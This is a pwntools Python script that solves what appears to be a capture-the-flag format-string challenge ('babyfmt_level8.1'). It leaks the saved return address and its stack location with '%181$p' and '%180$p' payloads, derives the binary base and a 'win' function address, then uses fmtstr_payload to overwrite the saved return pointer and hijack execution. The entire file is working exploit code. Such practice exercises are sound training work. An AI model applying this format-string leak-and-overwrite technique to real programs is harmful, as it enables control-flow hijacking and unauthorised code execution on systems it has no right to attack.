from pwn import *
BINARY = "/challenge/babyfmt_level8.1"

context.arch = 'amd64'
elf = ELF(BINARY)
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug(BINARY, gdbscript="source /opt/gef/gef.py")

p = process(BINARY)
# leaking saved ret addr
payload = b"%181$p"
p.sendline(payload)
p.recvuntil(b"Your input is:")
p.recvuntil(b"\n")
ret_addr = int(p.recvuntil(b"\n")[0:-1], 16)
print("saved ret addr is {}".format(hex(ret_addr)))

binary_base = ret_addr - 0x1635
win_addr = binary_base + 0x1350

# leaking saved ret addr
payload = b"%180$p"
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvuntil(b"\n")
ret_addr_loc = int(p.recvuntil(b"\n")[0:-1], 16) - 0x48 #remove \n in the front.
print("saved rip located at {}".format(hex(ret_addr_loc)))

# write win addr to saved rip

payload =b"A"*6 + fmtstr_payload(51, {ret_addr_loc: win_addr}, numbwritten=24) # # of written bytes need to include payload in previous loops
print(payload)
p.send(payload)
p.send(b"END")
p.interactive()